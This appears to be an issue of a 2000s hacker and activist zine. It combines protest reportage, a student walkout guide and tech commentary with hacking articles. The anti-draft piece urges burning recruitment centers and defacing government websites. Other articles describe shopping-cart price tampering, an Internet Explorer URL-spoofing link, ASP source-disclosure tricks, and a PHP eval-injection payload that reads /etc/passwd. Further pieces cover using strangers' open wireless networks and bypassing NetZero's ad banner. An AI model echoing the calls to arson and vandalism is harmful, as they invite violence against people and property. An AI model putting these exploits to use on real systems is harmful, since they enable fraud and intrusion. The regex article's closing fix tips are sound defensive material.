On Thursday, November 20 2003, governments and the ultra-rich held the
Free Trade Area of the Americas ministerial in Miami, Florida. The FTAA is a
trade agreement that decides the economic fate for 800 million people. Those
working on advancing the FTAA are seeking to create a “free-trade” block to
encompass all of North and South America (minus Cuba). This is being done
with absolutely no citizen input and has no chance to ever be ratified by the
people it governs.

In the days before, the ultra-rich and government officials mingled in the
American Business Forum to craft a plan for the FTAA, and one that was
eventually accepted. The rich and powerful were frightened though, so much
that they constructed a massive “anarchist-proof” fence surrounding a large
part of downtown Miami for the upcoming protests. Also, over 3000 police
were on duty, hired security for the interests of the upper class. Armed to the
teeth with rubber bullets, pepper spray, tasers, taser shields, tear gas, batons,
full riot gear, shields, armored personnel carriers, blackhawk helicopters, and
more, they turned Miami into a militarized police state in the days leading up
to the event. Over 32 law enforcement agencies participated in the effort- on
the streets there were everything from armed and deputized private security
contractors to Miami PD and even the Department of Homeland Security. 8.5
million federal taxpayer dollars were spent on police efforts to protect the richest
1% during the meetings. So why did the government decide to turn Miami,
amerika’s poorest large urban center, into a complete police state to protect
these scumbags?

Well, they say it was because of anarchists...
In the months leading up to the ministerial, people from all over the hemisphere
were planning on making their way to Miami on November 20. All sorts
of people mobilized for the Miami demonstration - Union workers, Students,
Farmers, Indigenous Peoples, Anarchists, Communists, and Religious groups.
The governments of the amerikas have routinely used military-style police
force to violently silence the voices and intentions of the people during these
demonstrations. To justify their fascist behavior, they repeatedly claim that a
group of “hard-core anarchists” come to destroy everything in the city and
cause mayhem in the streets. This lie is pushed through the televisions, newspapers,
and by police harassment of communities. By the time the demonstrations
come around, there is a media blackout on anything except for the sensationalized
police spin. The whole idea of “anarchists causing chaos” is actually
a fabricated historical argument, used since the 1800’s by the state and the
rich to discredit the motives and smear the name of anarchists. Anybody who
can open their eyes knows that the FTAA is true violence, that the police and
the governments that sponsor them are the true violence, and most of the
violence in the world is caused by them. Anarchists want to trade that violence
for peace and justice for all of humanity, not just the rich and powerful.

So what happened?
The protests started with the Root Cause march beginning 34 miles awaymarching
one mile for every country involved with the FTAA. The Root Cause
march involved many folks who are currently engaged in struggles against the
effects of neoliberal capitalism- the Coalition of Immokalee Workers, Miami
Workers Center, Power U Center for Social Change, Low-Income Families
Fighting Together, and the Free Carnival Area of the Americas. On Thursday,
November 20 was the main day of demonstration. Early morning saw a few
arrests from the more confrontational Direct Action marches. The largest
permitted rally was the AFL-CIO march, where thousands were corralled and
humiliated by police. While this march was filing into the Bayfront ampitheatre
around 4 P.M., a group of nearly 1000 people were dancing and milling about
near a police line. With no provocation, the police started firing rubber bullets,
pepper spray, pepper spray bullets, tear gas, and other projectiles into the
crowd. As the elderly, workers, students, and immigrants who couldn’t get
arrested started retreating, another police line blocked one of the two possible
exit routes- channeling people into downtown Miami
and eventually into a poor black neighborhood called
Overtown. Militant protestors constructed makeshift barricades
and put their bodies in front of the crowd. They
also defended the crowd fiercely, with slingshots, smoke
bombs, chunks of concrete, and quick maneuvering to
outpace the slow riot-gear clad stormtroopers. These
tactics prevented a mass arrest from happening- the
police scanners were reporting that they were trying to
surround the large group but couldn’t because of it’s
quickness. At the end of the day, there were about 50
arrests. Later that night word got out that a “FTAA-lite”
was drafted on Thursday.

The next day, hundreds of people went to the jail to
show support to their fallen comrades, and the legal
demonstration was surrounded by police as people were
beaten, pepper sprayed, and thrown in prison- even
though the crowd remained completely peaceful. The
legal defense team has confirmed that there were 4
instances of sexual assault upon prisoners and at least 6
cases of physical torture in jails- ranging from the police
and guards pepper-spraying inmates, beating inmates
bloody, and hosing naked inmates down with freezing
water in cold cells. At least 2 people were sent to the
hospital for head wounds, not counting the hundreds
that were treated by volunteer medics in the streets for
exposure to tear gas, pepper spray, baton blows, rubber
bullets, etc. Police actions have prompted the AFL-CIO,
United Steelworkers of America, and the Alliance for
Retired Americans to call for a congressional investigation
of the police efforts for Miami.

Free Trade = Slave Trade
The FTAA is part of a plan that started with the implementation
of North American Free Trade Agreement
on January 1st, 1994. NAFTA has caused hundreds of
thousands of high-paying jobs in the U.S. to be shifted to
sweatshop areas (often called “maquiladora zones”) in
Mexico and other places. Using NAFTA rules, Metalclad
(a US corporation) sued Mexico because a poor community
didn’t want Metalclad’s toxic waste dumped near
them. They won and Metalclad got $16 million from the
case. Canada banned a gasoline additive called MMT
because it was highly toxic to humans, and using NAFTA
rules, Ethyl Corporation forced Canada to drop the ban
and pay them money because the law was “unfair”.

NAFTA has literally run over democracy in communities
all over North Amerika in the interest of profits. One of
the main components of economic globalization is the
idea that “business has a right to make a profit”. Put
simply, this means that making a profit is more important
than life, democracy, or justice. The goals of these
agreements are to make it easy for corporations to strike
down regulations like clean air and water laws, minimum
wage laws, worker safety laws, and others. The whole
process is undemocratic, with secret meetings and “fast
track legislation” that prevents congress from ratifying
trade agreements.

The FTAA seeks to extend NAFTA to include all of North,
South, and Central Amerika, minus Cuba. If they cannot
do this through the FTAA, they will do it piece by piece
through regional trade agreements like the Central
American Free Trade Agreement. CAFTA is set to be
finished by this year and has the same vision as NAFTA
and the FTAA. These trade agreements contain different
plans, such as Plan Puebla Panama. PPP’s aim is to
destroy rainforests, displace indigenous communities,
and build a sweatshop superhighway through Cental
Amerika and Mexico leading into the United States.
Here, the workers will be paid dirt wages to make products
for US corporations, the products will be shipped
north and sold in amerika at inflated prices- once again
making insane profits for the rich who control the corporations
at the expense of the working poor.

Viva Resistencia!
Neoliberal globalization agreements have caused global
unrest since they were conceived. When NAFTA was
first implemented, indigenous communities led a rebellion
from the Lacandon jungle in the state of Chiapas,
Mexico.

In 2000, neoliberal policies caused Bolivia to sell its
water system to Becthel Corporation. Thousands of
people took the streets and forced the government to
end the deal. In Quebec in 2001, thousands of people
fought running street battles with vicious police that
tried stifling dissent. Over 4000 canisters of tear gas
were dispensed-some of which disrupted the meeting’s
activities. This is not to mention many other international
demonstrations and uprisings against other gears in the
machine of global capitalism- institutions like the World
Trade Organization, the International Monetary Fund
and World Bank, World Economic Forum, Trans-Atlantic
Business Dialogue, and Group of 8. The G8 is meeting
this June in Sea Island, Georgia.

More information at:
ftaaimc.org / infoshop.org / indymedia.org / midwestunrest.net / 
globalexchange.org/campaigns/ftaa/.


Fuck the Draft

Preperations are being made to bring back mandantory
military service within the United States. Proposed legislation
entitled the Universal National Service Act of 2003
would “provide for the common defense by requiring that
all young persons [age 18--26] in the United States, including
women, perform a period of military service or a
period of civilian service in furtherance of the national defense
and homeland security, and for other purposes,”.
Women would not be exempt from being drafted, and
college students would be brought in upon completion of
their current semester.

The bill currently sits in congress while the Selective Service
System with an additional $28 million is in preperations
for the draft. The SSS is expected to present to the
Bush administration on March 31, 2005 that the system
is ready to handle the draft. If the legislation passes, the
draft could start as soon as June 15, 2005 - after the
elections.

At the moment most military officials and politicians are
denying the need for a draft at this point in time. But the
occupation of Iraq is getting worse and worse every day
and there is no indication that we will be pulling troops
out anytime soon. Bush’s perpetual ‘war against terrorism’
might last decades and decades, and new wars will
require new cannon fodder.

While most of the madness of the war on terror was
brought about by Bush and the Republicans, it is interesting
to note that the draft legislation was proposed
by democrats. Even if we do manage to get
Bush out of office we will still be “staying the course” in
Iraq and the war on terrorism; considering that the Vietnam
war was escalated by Lyndon Johnson. Kerry voted
to support the war in Afghanistan, Iraq, and the USA PATRIOT
Act: don’t be surprised if they bring back the draft
under the Kerry administration.

Realizing that the trend of unjust attacks on our freedoms
will continue under either a democratic or republican
presidency, it will become increasingly necessary
to explore creative tactics of resistance outside the realm
of mere electoral politics. The next several years we will
be witnessing a radical transformation of our society and
the way we live . We can no longer afford to be apathetic.
It’s time to stand up and fight back. Extreme times call
for extreme measures; the fight for freedom and liberation
knows no bounds. Evading the draft, defacing government
websites, and burning recruitment centers, all
of which and more are serious tactics that need to be
considered if we can ever hope to resist and overcome
this injustice.


Bugs in the Wild by Rah

Well my friends, I have finally decided to start writing
this column. After much thought, I was at a
loss as to what to write about as far as “Bugs in
the Wild” go. I mean come on, there are just so
many that I would never be able to list them all
in one article. So taking into careful consideration
a few factors I have compressed the column into
what I believe www.HackThisSite.org users will
benefit from.

Before I begin the actual “meat and potatoes” of
the column, I’d like to take a minute to introduce
myself to everyone. I go by the screenname RaH
on HackThisSite. I have been a user of the site for
around 6 months or more. Hacking has interested
me since I got my first computer 7 years ago.
BLEH! Enough on me, who wants the Bugs?

The bugs I have for you in this edition are by no
means 0day exploits. Anyone who can use a
search engine can find this information out for
himself or herself. All right. Having gotten that out
of the way, allow me to introduce you to our first
“Bug in the Wild”. This bug has been around for
sometime, it is I think a well known exploit dealing
with the way some “Shopping carts” at sites
handle user input. The vulnerability exists in dealing
with hidden form fields. By downloading the
web-page, one is able to alter the price of an item,
change the url then make their purchase for their
altered price and then buy said item. I thought I
would add this one, because in a way it pertains
to a level on HackThisSite.org. I’ll not tell which.

We all know Microsoft is a buggy OS. We all have
had at one time or another the dread “Blue Screen
of Death” lovingly referred to as the B.S.o.D.
There exists many vulnerabilities in the OS itself
and also the applications it comes with. I’ll use
Internet Explorer as my next bug in the wild. To
exploit this rather lame trick, one simply creates
a web page containing a link to another page.
What makes it so special is the fact that once
viewed in IE the address is spoofed to be any site
you want. For this one I’ll include proof of concept
code. By using the tag <a href=”www.snap.
com%01@hackthissite.org>LINK</a> a viewer is
tricked into thinking they are viewing www.snap.
com. When they see the page though, it looks as
if www.HackThisSite.org has been put up in it’s
place. This bug works because of URL handling
compliance. It turns out that because IE is compliant
with present standards this bug occurs. The
%01 is not seen by IE thus everything after it is
hidden from the browser, yet it still gets directed
there. Odd stuff.

The next few are also MS related allowing for remote
code execution by an attacker. NOTE: I will
not post proof of concept code for these. Again
all of these bugs can be found on most security
sites.

In Microsoft VB for applications, there exists a
heap-based buffer overflow condition. When exploited
properly remote code execution is possible.
By using a document with a long ID parameter,
VBE.DLL and VBE6.DLL are vulnerable.
This condition exists currently in SDK 5.0 through
6.3. There exists in IIS 4.0, 5.0, and 5.1 a crosssite
scripting vulnerability in the ASP function that
handles redirection. Which could be used to allow
a remote attacker to embed a URL containing
script in the redirection message.

For my last one, I will do one that I like. There
is no particular reason I like it except to say that
anyone can do it without a script. In ASP pages
you can coerce the server to give up more information
it should by using two extra . after the
asp tag. EX: www.hackthissite.org/rah.asp.. Now
there is a fix for that, but as quickly as they fixed
it a work around was found. By replacing the initial
dot www.hackthissite.org/rah( . )asp with the
%22 or %20 equivalent you are able to recreate
the bug. There is also another one for ASP pages
using ::$DATA EX: www.hackthissite.org/rah.
asp::$DATA can get you some choice info.

Well that about wraps up my column for this issue.
I hope you enjoyed it, and maybe even learned
from it. Remember hacking is a way of life. Should
you get caught, remember these words: “Drop not
the soap”!


OS Wars: Corporate giants stomping
the free software movement by RaH

STOP! Do not read this any further. You are now violating
some type of law! This very well could be the battle cry to
come. You must format your system immediately and then
turn it off.

In a landmark decision, The United States Supreme Court
ruled in favor of the Unix Operating System provider Santa
Cruz Operation or SCO. The SCO group fi led petitions
against several major corporations, the latest target being
Auto Zone. SCO claims that Auto Zone violated the Unix
licensing agreement because it is using a version of Unix
called Linux-an open operating system rapidly growing in
the software industry. In other news SCO dropped its lawsuit
against hardware manufacturer, IBM due to the lack of
evidence. The unanimous vote by the Supreme Court ruled
in favor of SCO. This decision means that all content on the
Internet; including content stored on personal computers,
is owned by SCO. You must uninstall everything from your
computer and never turn it on again.

Though the previous paragraph is fi ctitious, the drama it
portrays is very real. SCO did fi le a lawsuit against Auto
Zone and many other corporate giants. SCO claim that
these companies are using a version of Linux containing
proprietary SCO code. SCO petitioned the courts to have
these software companies searched though the details are
unclear as to what was actually copied from Unix.

In the past, SCO has been a major contributor to the Open
Source community, boasting it as “the way of the future”,
yet they are in court battling over code ownership. Just like
the corporate bully Microsoft, they are battling over money
and profi t. To preserve and patent is their business motto.

The written language has been around for centuries. Yet
no one have tried to copyright individual words. If words
are like functions in a program, then could these words or
code be owned? There are many unique ways of coding
the same function in a program. Copyright claims ought to
be enforced in the overall performance of a program, rather
than the use of functions themselves.

Royalties is where this whole lawsuit lies. An interesting fact
is that Microsoft, one of the world’s leading OS manufacturer
and developer, had arranged to have another corporation
fund SCO in its attacks.

(1) “For months, rumors have swirled around the Web alleging
that Microsoft helped fi nance a small Utah software
company’s suit against IBM and two corporations that use
Linux software. Business Week has learned that Microsoft
did not put up the money, but did play matchmaker for SCO
Group and BayStar Capital, a San Francisco hedge fund
which made a $50 million investment in SCO last October.”
This excerpt is taken from Business Week online. Further
in the article Lawrence Goldfarb is quoted, “neither Chairman
William Gates nor CEO Steve Ballmer were among
the people from Microsoft who approached him.”

(2)On 3 March 2004 Judge Brooke C. Wells ordered IBM
to produce the disputed code, which SCO claim IMB was
using falsely. The Judge also ordered the SCO group to
produce the code they claim IBM had moved from Unix to
Linux. The SCO group was also ordered to identify all code
IBM had allegedly moved. As of today’s date no further
details have come forth. No doubt both parties have been
advised not to comment on the case.

So just where does Microsoft fit into all this you ask?

(3)According to the Open Source community, there was a
memo leak from the SCO offi ce in Utah to SCO executives
referring to money provided them by Microsoft. Below is a
link to the alleged email sent internally by SCO. It appears
that Microsoft is ganging up with SCO in an effort to squash
Linux and further their own dominance in the software industry.

Microsoft has coerced the SCO group into this lawsuit.
Sometime ago Microsoft invested money in SCO by buying
their software licenses for several million dollars. This action
essentially equipped SCO with fundings in court.

Has the giant Microsoft been planning this all along? Is this
their push to force out the underdog? Something similar to
this took place with Apple in 1985. And Microsoft have gotten
the upper hand on that occasion too.

It is sad that major corporations own this planet. They own
everything on it, and they even think they own the people!
To some extent they do. But what could one do about this?
Well, for starters reading this article is the first step toward
awareness.

Knowledge is power! What a person choose to do with this
power defines which side of the fence he or she stand on.
Practice acquired skills and learn all that is possible. Write
solid code, should one choose to start a software company,
write eloquent code that flows through execution. Make it
as secure as possible, keeping in mind it is a labor of love.


Exploring the Wireless World
on your Mac by ikari

A few months ago, I was vacationing in Sun Valley with my family.
After a long day of living the capitalist dream and spending my hardearned
money in the various shops and stores of the Idaho resort
town, I came home to relax and check my email. I took out my iBook,
plugged it in to the phone line, and opened up AOL (yes, it’s AOL, but
damn, they have dial-up numbers everywhere. That’s all I use it for. I
swear.) After connecting at 28800bps, I opened up my AOL mailbox
that hadn’t been used in 3 years and cleared the 1,000+ spam messages
from it. I then proceeded to check my email on my main account,
waiting patiently for each message to trickle down the phone
line. I said to myself, “There’s got to be a faster way to do this.” I remembered
hearing from friends earlier that, when they needed to use
the internet on the run, they just hopped on to a nearby wireless network
and sought out a DHCP lease, hoping they could get on the web
at the expense of a computer-illiterate consumer who just plugged in
a wireless router set to factory defaults to his broadband network. The
legality of such an act is still rather unclear, but I was (and still am)
young, and didn’t really care either way. So, I grabbed my iBook, and
set out into the town to fi nd wireless freedom.

Once I manually found a wireless access point, I used that access
point to download a Mac-based “stumbling” program, called iStumbler.
It’s not the only one out there, but it suits my needs the best. The
main ones for Mac are iStumbler, MacStumbler, and KisMAC, but it’s
really just a matter of personal preference as to which one to use.
Once you’ve got yourself this software, you can drive (or walk, for that
matter) around and attempt to fi nd open wireless networks. You can
use your standard internal antenna, or buy/build an external antenna.
The most common (so it seems) antenna in the wardriving world is a
waveguide, more commonly known as a “cantenna”, because of its
quality and price. I built my cantenna with about $20 in parts and a
$3 can of chili, and it runs circles around my iBook’s built-in antenna.
For example, I mapped out a route around Salt Lake City, and drove it
twice, once with just my iBook, and once with the cantenna attached.
I got 40 APs with my iBook, versus 700 or so with my cantenna.
There’re a number of websites out there devoted to wardriving and
with detailed instructions on building a cantenna, so Google around a
bit so I don’t have to explain it here. All of the Mac, and most of the PC
wardriving programs include some sort of GPS/mapping functionality,
so if you have an NMEA-compatible GPS (most Garmin models) and
a serial cable for the GPS, you can keep track of your wardriving on
a spiffy-looking map.

Once you’ve got yourself a wireless notebook and all the gear you
want/need, set out upon your local neighborhood and see what you
fi nd. You can choose to be active or passive in your wardriving, active
involving connecting to the networks and gaining internet access/
hacking/whatever, and passive involving just looking around, seeing
what’s there. Passive wardriving should have no legal implications,
but the legality of active wardriving, especially depending upon your
defi nition of “active”, is fairly unclear in most states. It’s your responsibility
to know the laws of your area and you are responsible for what
you do while wardriving. With that said, grab your stuff, grab an antenna,
and get out the door! Explore the wireless world!


how to organize a...
STUDENT REVOLUTION!

Students from Lombard, Illinois walk out of school on March 20 to protest the war in Iraq. Later joined
up with Chicago anti-war actions to commit acts of civil disobedience and shut down the city.
Student walkouts are a powerful act of protest. It can be
a way to unite with your peers and build a culture of resistance
at your school. It is a way to temporarily turn your
school upside down and put the students in charge for a
change. It is also valuable organizing training for when
the real revolution comes. And if done right, it can have
a big enough impact that actual change in the system
is made.

Probably the fi rst comment you’ll have is “something like
that will never happen at my school”. At least that’s what
I was saying at the beginning of my senior year of high
school. I never thought we would be able to get away
with half the stuff we pulled off. Our school was so boring,
mundane, uninteresting. By the end of the year, we
had published an underground newspaper distributed in
several local high schools, had formed a network of radical
student activists, and organized a student walkout of
hundreds of kids in protest of the war in Iraq. The entire
culture of the school has changed, and by then I actually
looked forward to going to school because there were so
many interesting things happening every day.

There is absolutely no reason why you cannot accomplish
the same, or better. The ultimate achievement
would be a student strike, sit-in, or walkout. But before
the fun stuff comes a lot of movement building. Set your
sights high, but take practical approaches to your goals.

Before we go any further, your movement must be _
about_ something. If it’s just ‘for the hell of it’, you should
stop reading now because you will fail miserably regardless.
So you need a cause behind your movement? No!
You need a movement behind your cause! If you do not
have a clear message, you will be quickly written off as
mindless teenage rebellion. By having a purpose for the
action, you gain legitimacy among faculty and conservative
students and reduce the risk of discipline from the
authorities. So make this meaningful. Remember: this
is a forum for you to express your dissatisfaction with
the status quo. Believe me, every school has something
unfair about it - dress code, censorship, abusive administrators,
pledge of allegiance, etc. If you play your cards
right, something may even get done about it.

Right. So now that you have selected a few issues to
raise a ruckus about, the fi rst thing you must do before
you develop grandoise plans for student revolution is to
start talking to people. Gather their thoughts about these
issues. Try to get them all riled up and wanting to take
action. While many people have their personal differences,
almost everyone if you talk to them long enough
will agree on some fundamental principles that things are
incredibly unfair and something should be done about it.

You will quickly discover that one of the fi rst things that
you must overcome is any personal inhibitions you might
have towards people. Do NOT be shy or self-restrained.
Don’t be afraid to go up to total strangers in a friendly way
and start sharing all these personal experiences. Reach
out to people of different cultural backgrounds. Don’t let
social cliques and popularity contests keep the student
body divided - believe me, everyone can unite around
the common idea that school is a big waste of time.

Once you get a band of students who want to do something
about it, you should call a general meeting. Make
little fl yers and posters and put them up around school
announcing when, where, and why. Get everyone you
can together in one room to make some decisions about
what can be done about the issue in question. Have everyone
go around the room and introduce themselves.
Make sure no one feels uncomfortable or left out. I also
recommend that you read up about how to organize a
meeting based on the directly democratic concensus
process where everyone is equal to share ideas on an
anti-authoritarian basis.

Whether you want to organize an offi cial student group
or remain unoffi cial is up to you. There are advantages
and disadvantages. While being an offi cial student organization,
the administration will be forced to consider
your actions with more legitimacy, and provide you with
school resources, rooms, announcements on the PA,
putting posters up around school, etc. However, you are
bound by school regulations, which may tie your hands
from any fun or rebellious activities. Of course, that does
not mean that you can work independent of the organizationIt
entirely depends on the context of your school.
Gather as much information about school policies regarding
student organizations and discuss this choice
with the other group members.

Now that you have an activist scene growing at your
school, it’s time to release some publications. Consider
making an underground newsletter to bring your message
to the people. Make the content quick, concise, but
most importantly, INTERESTING! Boredom is counterrevolutionary.
Your movement needs to be fun, enjoyable
and exciting, or no one will want to participate. And when
you distribute it to students, raise a ruckus! Stand near
the doors in the cafeteria handing out your propaganda
while shouting stuff! Make a scene! Blow bubbles and fill
the halls with laughter! Get hundreds of copies to your
friends so that they can distribute them to their friends
and their friends, etc. Make sure every single student has
access to it. And promote discussion - bring up the debate
in your classes, at lunch tables, with strangers in the
lunch line, etc. By now, it has entered mass consciousness,
the seeds have been planted, you have a strong
activist scene, and the time is ripe for an action.

What you should do depends entirely on the context
your movement takes place in. Try to coincide your action
with a particular date of significance(in response to
a controversial policy made by the government or your
school administration, anti-war protest in nearby cities,
etc). If possible, look at your local independent media
center(indymedia.org) to see if there are other student
activist groups planning any actions - and try to coordinate
your actions with theirs. Some things to consider
might be a student walkout, a sit-in in your school, a
march to join up with a larger protest downtown, or in
some situations, a simple teach-in to just discuss the
issues might be appropriate. However, in order to have
any degree of success, you must find a way to bring all
the unfocused meaningless rebellion into organized rebellion
with a purpose.

Weeks before the event, you should prepare some outreach
propaganda. Tape posters up on the walls, in restrooms,
classrooms, bulletin boards. Make quarter page
flyers explaining where, when, and why. Make a website,
advertise it in the official school paper. If you can, try to
get it on the school announcements. Make it exciting -
hype it up! Make it the topic of everyone’s discussion. Tell
everyone you see - even people you don’t know. Do not
be afraid to talk to people you don’t know - get used to
presenting your movement in a quick two minute discussion,
and _don’t be shy_!

Handling the local press is an important factor to consider.
A press release should be drafted explaining what,
who, where, when, and why. It should be short and concise,
yet still keep all the points you want to make intact.
Stick to a few key phrases that are repeated everywhere
- signs, buttons, leaflets, etc. Around a week before the
event, send press releases to all the local newspapers
and television networks. Try to invite reporters to take
pictures and interview people. Bring your own people to
take pictures and document the event. It is easy to get

The protest itself is a blank canvas for you to draw on.
Have ideas for activities ready. Don’t be afraid of creating
a ruckus - but everything you do must have an obvious
purpose. Keep things light-hearted and energetic. Don’t
sit still for a second - dull moments are killer, and people
will lose interest. Bring fun things to the protest itself.
Make drums out of buckets. Make flags and signs. Bring
people to play instruments. Get a dance circle going.
Have lots of random shit to hand out. Consider graffiti
to add some life to your area. Make it lively, entertaining,
and interesting - yet still have a very clear, concise
point which you are able to back up. When people start
leaving, they should be filled with the spirit of activism,
having made contacts with other activists, and looking
forward to or organizing their own future actions. People
should be energized and empowered after the action, not
disenchanted and dulled.

There is a certain high one can get from organizing a
successful action. If done right, the protest can bse a liberating
experience for you and your comrades beyond
the best sex or drugs. If you catch the ecstasy of the moment,
you know you have been doing something right.

After the action, you should prepare a communique
about the events, and call upon other members and their
parents to call the school board to leave their comments.
Depending on the success of your action, they may be
forced to issue a statement or change policies if you have
built a solid movement with a serious argument that pressures
the power that be. And there’s room to grow.

You’re probably wondering why this guide appeared in
this magazine. It’s not about hacking(computers, that is).
However, it is about building movements of people to accomplish
something in real life - a quality that is lacking
in computers and computer users. In this increasingly
oppressive world, people need to work with others and
fight for social justice. All too often hackers consider
themselves elite and above it all in the compute realm,
but when presented with injustice in the realm world,
they simply submit themselves to dominating forces. No
more. Resistance is fertile!


Hacking Regular Expression by ReDucTor

The issue you are about to use, is with in perl compatable regular expression (PCRE), not with in POSIX Regular
Expression. Now, lets start looking at some code:

$body = preg_replace(“/\[b\](.*)\[\/b\]/si”,”<b>\\1</b>”,$body);
$body = preg_replace(“/\[i\](.*)\[\/b\]/si”,”<i>\\1</i>”,$body);
$body = preg_replace(“/\[u\](.*)\[\/u\]/si”,”<u>\\1</u>”,$body);
$body = preg_replace(“/\[img\](.*)\[\/img\]/si”,”’<img src=\”’.str_
replace(‘ ‘,’%20’,’\\1’).’\”>”,$body);
$body = preg_replace(“/\[url\](.*)\[\/url\]/sie”,”’<a href=\”’.str_replace(‘
‘,’%20’,’\\1’).’\”>\\1</a>”,$body);
$body = preg_replace(“/\[url=(.*)\](.*)\[\/url\]/sie”,”’<a href=\”’.str_replace(‘
‘,’%20’,’\\1’).’\”>\\2</a>”,$body);

Nice BB Code uh?
[b]bold[/b] [u]underline[/u] [i]italics[/i] [img]http://somesite.com/img.gif[/img]
[url]http://somesite.com/[/url] [url=http://somesite.com/]Some Site[/url]

Can you spot a way to expoit it? Lets take a look at the url tags and img tag. 
[img]http://somtesite.com/img.gif[/img]

Then becomes ‘<img src=”’.str_replace(‘ ‘,’%20’,’http://somesite.com/img.gif’).’”>’

This then gets put through eval:
eval(‘<img src=”’.str_replace(‘ ‘,’%20’,’http://somesite.com/img.gif’).’”>’)

How can we exploit it?, how about leaving the quote marks, then inserting file_get_contents(‘/etc/passwd’)
[img]http://somesite.com/img.gif’.fi le_get_contents(‘/etc/passwd’).’[img]

This then becomes:
eval(‘<img src=”’.str_replace(‘ ‘,’%20’,’http://somesite.com/img.gif’.fi le_get_contents(‘/
etc/passwd’).’’).’”>’)

Woah, look at that, now we have the contents of /etc/passwd. So your a webmaster, and just realised your vulnerable
to this sorta stuff, heres a few tips:
1. Use literal strings
2. Escape The literal char, e.g. turn it into an entitiy
3. Use preg_replace_callback instead
4. Match only what you need not everything
And people with regex test sites, get to work fixing, your going to be big targets now! Have fun!


Bypassing Netzero’s Ad Banner by plastek

Introduction - netzero.com

When using NetZero, the most annoying thing is that
banner at the bottom of the screen. Loading those
ads lags your connection. This really isn’t that bad
especially since the service is free; except for the fact
that you never click on any of those anyway. All the
banner at the bottom of the screen does is slow you
down and take up space. So you ask, how do I kill
the banner? Well of course like anything, there is an
exploit for this. This exploit is manual, which means
you do it yourself. Sooner or later I’ll write a program
to do it.

After getting some background information from a
friend (who prefers to remain anonymous), I discovered
this exploit pretty quickly.

Background
Ever look in a directory on your hard drive and see
all those .dll files? Ever got the impression that they
were just taking up space? Well actually DLL’s are
very important.

First off, DLL stand for Dynamic Link Library. To understand
what a DLL is and how one works, consider
this. You have a computer with Windows 3.1 and
you want to upgrade to Windows 95. So you go out
and buy Windows 95, install it, and it works without
a flaw (keeping in mind this example is hypothetical,
Windows 95 will never run flawlessly). So you take
all software you had on your old computer and start
installing it. Now of course you expect the software
you are installing to look the same in Windows 95 as
they did in 3.1 After all, how could they change? They
were made before Windows 95 was anyway. That’s
where you go wrong, and that’s where DLL’s come
in. As soon as you start up one of the programs, you
notice the title bar is different. It’s a Windows 95 title
bar, with an icon next to the name of the program,
and an “x” button to close the program next to the
traditional maximize and minimize buttons. You wonder
how this is possible. The answer is in the DLL.
There is DLL that all programs in Windows 95 access
to get information. Since the DLL in Windows 95 had
the same name as the one in Windows 3.1, the old
program will access it as well.

DLLs contain information on how to do something.
This something could be connecting to the Internet,
how to access your printer, or in this case, how to go
and build a new window, how to design it etc’. The
good thing about DLLs is that they:
a) Can be loaded and unloaded when the program is
done with the action the DLL was required for, which
saves up some valuable memory.
b) DLLs can be shared between several programs.
For example: if you have two or more programs that
have the option within them to start a PPP session
with your dial-up Internet provider, they can all just
use the same DLL, which means saving up some
disk space (you won’t have to have the same DLL
stored on your hard drive three times). The Unix
equivelants to DLLs are libraries (“libs”).

Preparation
Open up Windows Explorer and get to C:\Program
Files\NetZero\bin. In this directory there is a file called
‘net.dll’. Keep your attention on this file, because in
just a few moments we will move it. Now without
changing the directory, position the left side of the
screen that only shows the directories so that you
can see the directory where you are going to move
‘net.dll’. This is so when you have to move the file,
you won’t have to go looking around for a place to
put it. This is only done to speed up things, because
timing in this exploit is an important factor.

**Note: It isn’t important where you move ‘net.dll’, as
long as it is not in the NetZero directory and that you
remember where you put it.**

Carrying Out The Exploit
Keeping Windows Explorer open, start up NetZero.
Click ‘connect’ and wait for your modem to dial and
connect. As soon as your modem stops screaching
(if you have your modem speaker turned off, turn
it back on using control panel --> modem), quickly
switch back to Windows Explorer and move the ‘net.
dll’ file to another directory. The connection will complete.
At this point you would expect your browser
to open and for the banner to pop up. But nothing
happens. Don’t worry, the connection is fine, and you
won’t get booted off. You have just fooled the banner
program. When you’re done using the Internet,
just close your borwser and a prompt will come up to
close NetZero. Or just double click on the icon in the
toolbar at the bottom of the screen with the two computer
screens. There should be a disconnect button
on that. After you’ve signed off, move ‘net.dll’ back to
C:\Program Files\NetZero\bin

How This Exploit Works
Obviously, the important part of this exploit is the file
‘net.dll’. The NetZero start up program needs to access
this file, that’s why you have to move it back
when you’re done. The banner program needs to
access this file too. If it can’t find the file, the program
just doesn’t start. Strangley enough, it doesn’t
boot you off or anything. Lately when using this exploit
I have noticed something though. The inactivity
timeout rate is extremely low, like 5 minutes or
something.

Enjoy it.


Elections Undermine Democracy by DragonMaw

Internal development memos
Diebold provides electronic voting systems for 37
different states. These systems have come under
extreme controversy due to serious security
issues which have come to light through internal
development memos that hackers have leaked
to the public. This raises the question of how
corporations using privatized coding systems
threaten the democratic electoral process.

Diebold Electronic Voting Systems sued several
distributers of the leaked memos, claiming that
“they violated copyright law”. This was shown to
be false by several students at major universities,
as the memos did not meet the DMCA requirement
for copyrighted material. Excerpt:

“Diebold’s blanket cease-and-desist notices are a
blatant abuse of copyright law,” said [Electronic
Frontier Foundation] Staff Attorney Wendy
Seltzer. “Publication of the Diebold documents
is clear fair use because of their importance to
the public debate over the accuracy of electronic
voting machines.”

The staff at Why-War.com launched an electronic
civil disobedience campaign against Diebold,
mirroring copies of the memos to hundreds of
places on the internet, including file sharing
services, usenet, and www mirrors. In response,
Diebold launches more lawsuits for the leaking
of internal memos to the general public. This is
proved in court to be a violation of the freedom of
information act as well as the bill of rights(freedom
of speech).

Finally, due to the success of the electronic civil
disobedience campaign, press coverage of the
memos, the denouncement of their legal tactics,
and a federal order, Diebold retracted all ceaseand-
desist letters and suits, and offered a public
apology.

Freedom of Information
The Diebold scandal raises all sorts of
controversial legal and ethical dilemmas. The
accountability of private corporations who abuse
copyright and freedom of information law, the
threat to the democratic process that proprietory
coding poses, and etc.

Corporations, in the defense of their relentless
quest of the almighty dollar, have violently
disregarded the constitution. If the democratic
process can be sold to the highest bidder, then
the public will forever be under the greedy wrath
of profiteering corporations who have no concern
of the fundamental rights to freedom of the press
and democratic elections.

Activists are angry, demanding that all information
must be released to public scrutiny; instead of
being locked away, hiding important and damning
secrets which would hurt “profit”. A closed
privatized voting system undermines the very
concept of open, public, and democratic elections.
Public systems should be based on an opensource
model, which historically have yielded the
most secure, stable, and democratic systems.

Political Ties
It is of little surprise that Diebold has made large
financial contributions to the Bush administration.
Would you want a president who received
dirty money from breaking copyright law and
undermining the democratic process?

A Dose of Optimism
Diebold has been proven wrong, criminally
negligant, and threatens to undermine the
democratic process of our country. The Diebold
